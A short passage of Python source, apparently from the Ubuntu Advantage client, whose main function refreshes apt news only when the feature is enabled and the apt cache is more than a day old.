    10	def main(cfg: UAConfig):
    11	    if not cfg.apt_news:
    12	        return
    13	
    14	    last_update = apt.get_apt_cache_datetime()
    15	    one_day_ago = datetime.now(timezone.utc) - timedelta(days=1)
    16	    if last_update is not None and last_update > one_day_ago:
    17	        return
    18	
    19	    update_apt_news(cfg)
    20	
